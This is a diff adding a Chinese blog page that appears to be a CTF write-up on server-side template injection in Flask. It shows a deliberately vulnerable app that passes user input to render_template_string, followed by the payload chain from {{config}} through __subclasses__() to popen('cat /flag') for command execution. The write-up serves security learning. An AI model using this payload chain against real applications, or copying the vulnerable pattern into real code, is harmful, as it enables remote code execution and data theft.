@@ -1,0 +1,210 @@
+
+<!DOCTYPE html>
+<html lang="zh" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>2026-8-14-SSTI - 二月の档案室</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="二月, 博客, 技术, 分享, 记录, 学习, 分享, 记录, 档案室, 技术分享,  february, blog, technology, share, record, learn, share, record, archive, technology share,"> 
+    <meta name="description" content="所感所想，所言所行，我将以文字记录我自己。,SSTI123456789101112131415161718192021222324252627282930313233343536373839404142from flask import Fl,"> 
+    <meta name="author" content="Allureluoli"> 
+    <link rel="alternative" href="atom.xml" title="二月の档案室" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+    
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="2026-8-14-SSTI - 二月の档案室"/>
+    <meta name="twitter:description" content="所感所想，所言所行，我将以文字记录我自己。,SSTI123456789101112131415161718192021222324252627282930313233343536373839404142from flask import Fl,"/>
+    
+    
+    
+    
+    <meta property="og:site_name" content="二月の档案室"/>
+    <meta property="og:type" content="object"/>
+    <meta property="og:title" content="2026-8-14-SSTI - 二月の档案室"/>
+    <meta property="og:description" content="所感所想，所言所行，我将以文字记录我自己。,SSTI123456789101112131415161718192021222324252627282930313233343536373839404142from flask import Fl,"/>
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+    <script>window.searchDbPath = "/search.xml";</script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro&display=swap" rel="stylesheet">
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">二月の档案室</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="https://blog.curesky.site"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">2026-8-14-SSTI</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">2026-8-14-SSTI</h1>
+        <div class="stuff">
+            <span>八月 14, 2026</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/Python/" rel="tag">Python</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h3 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">FLAG = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> os.path.exists(<span class="string">&quot;/flag&quot;</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            FLAG = f.read().strip()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        FLAG = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args.get(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;guest&quot;</span>)</span><br><span class="line"></span><br><span class="line">    template = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &lt;!doctype html&gt;</span></span><br><span class="line"><span class="string">    &lt;html&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;</span></span><br><span class="line"><span class="string">        &lt;meta charset=&quot;utf-8&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;SSTI&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;/head&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;body&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Welcome <span class="subst">&#123;name&#125;</span>&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">    &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span>,</span><br><span class="line">        port=<span class="number">5000</span>,</span><br><span class="line">        debug=<span class="literal">False</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure>
+
+<p>题目地址：https:&#x2F;&#x2F;www.ctfplus.cn&#x2F;problem-detail&#x2F;1983793861520003072&#x2F;description</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name=&#123;&#123;2*2&#125;&#125; 响应 4</span><br><span class="line"></span><br><span class="line">name=&#123;&#123;config&#125;&#125; 响应 </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Welcome &lt;Config &#123;&#x27;DEBUG&#x27;: False, &#x27;TESTING&#x27;: False, &#x27;PROPAGATE_EXCEPTIONS&#x27;: None, &#x27;SECRET_KEY&#x27;: None, &#x27;SECRET_KEY_FALLBACKS&#x27;: None, &#x27;PERMANENT_SESSION_LIFETIME&#x27;: datetime.timedelta(days=31), &#x27;USE_X_SENDFILE&#x27;: False, &#x27;TRUSTED_HOSTS&#x27;: None, &#x27;SERVER_NAME&#x27;: None, &#x27;APPLICATION_ROOT&#x27;: &#x27;/&#x27;, &#x27;SESSION_COOKIE_NAME&#x27;: &#x27;session&#x27;, &#x27;SESSION_COOKIE_DOMAIN&#x27;: None, &#x27;SESSION_COOKIE_PATH&#x27;: None, &#x27;SESSION_COOKIE_HTTPONLY&#x27;: True, &#x27;SESSION_COOKIE_SECURE&#x27;: False, &#x27;SESSION_COOKIE_PARTITIONED&#x27;: False, &#x27;SESSION_COOKIE_SAMESITE&#x27;: None, &#x27;SESSION_REFRESH_EACH_REQUEST&#x27;: True, &#x27;MAX_CONTENT_LENGTH&#x27;: None, &#x27;MAX_FORM_MEMORY_SIZE&#x27;: 500000, &#x27;MAX_FORM_PARTS&#x27;: 1000, &#x27;SEND_FILE_MAX_AGE_DEFAULT&#x27;: None, &#x27;TRAP_BAD_REQUEST_ERRORS&#x27;: None, &#x27;TRAP_HTTP_EXCEPTIONS&#x27;: False, &#x27;EXPLAIN_TEMPLATE_LOADING&#x27;: False, &#x27;PREFERRED_URL_SCHEME&#x27;: &#x27;http&#x27;, &#x27;TEMPLATES_AUTO_RELOAD&#x27;: None, &#x27;MAX_COOKIE_SIZE&#x27;: 4093, &#x27;PROVIDE_AUTOMATIC_OPTIONS&#x27;: True&#125;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>构造对象链</p>
+<p>name&#x3D;’’.<strong>class</strong></p>
+<p>响应 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Welcome &lt;class &#x27;str&#x27;&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>name=&#123;&#123;%27%27.__class__.__mro__&#125;&#125;</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Welcome (&lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)</span><br></pre></td></tr></table></figure>
+
+<p><code>name=&#123;&#123;%20%27%27.__class__.__mro__[1].__subclasses__()%20&#125;&#125;</code></p>
+<p>列出所有子类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Welcome [&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;async_generator&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;bytearray_iterator&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes_iterator&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;builtin_function_or_method&#x27;&gt;, &lt;class &#x27;callable_iterator&#x27;&gt;, &lt;class &#x27;PyCapsule&#x27;&gt;, &lt;class &#x27;cell&#x27;&gt;, &lt;class &#x27;classmethod_descriptor&#x27;&gt;, &lt;class &#x27;classmethod&#x27;&gt;, &lt;class &#x27;code&#x27;&gt;, &lt;class &#x27;complex&#x27;&gt;, &lt;class &#x27;coroutine&#x27;&gt;, &lt;class &#x27;dict_items&#x27;&gt;, &lt;class &#x27;dict_itemiterator&#x27;&gt;, &lt;class &#x27;dict_keyiterator&#x27;&gt;, &lt;class &#x27;dict_valueiterator&#x27;&gt;, &lt;class &#x27;dict_keys&#x27;&gt;, &lt;class &#x27;mappingproxy&#x27;&gt;, &lt;class &#x27;dict_reverseitemiterator&#x27;&gt;, &lt;class &#x27;dict_reversekeyiterator&#x27;&gt;, &lt;class &#x27;dict_reversevalueiterator&#x27;&gt;, &lt;class &#x27;dict_values&#x27;&gt;, &lt;class &#x27;dict&#x27;&gt;, &lt;class &#x27;ellipsis&#x27;&gt;, &lt;class &#x27;enumerate&#x27;&gt;, &lt;class &#x27;float&#x27;&gt;, &lt;class &#x27;frame&#x27;&gt;, &lt;class &#x27;frozenset&#x27;&gt;, &lt;class &#x27;function&#x27;&gt;, &lt;class &#x27;generator&#x27;&gt;, &lt;class &#x27;getset_descriptor&#x27;&gt;, &lt;class &#x27;instancemethod&#x27;&gt;,  ......</span><br></pre></td></tr></table></figure>
+
+<p>我们找到能执行命令的类</p>
+<p>例如 subprocess.Popen</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=&#123;&#123;%27%27.__class__.__bases__[0].__subclasses__()[138].__init__.__globals__.popen(%27cat%20/flag%20/%27).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>拿到flag</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="https://blog.curesky.site/audio/yinlang.mp3"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+        
+    <div id="gitalk-container" class="comment link"
+		data-enable="true"
+        data-ae="true"
+        data-ci="10a7f71656553fd4676c"
+        data-cs="48f8d183288b4d0b2531f047719dee43bdc913ec"
+        data-r="allureluoli.github.io"
+        data-o="allureluoli"
+        data-a="allureluoli"
+        data-d="false"
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class="side">
+            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSTI"><span class="toc-number">1.</span> <span class="toc-text">SSTI</span></a></li></ol>
+        </div>
+    
+</div>
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
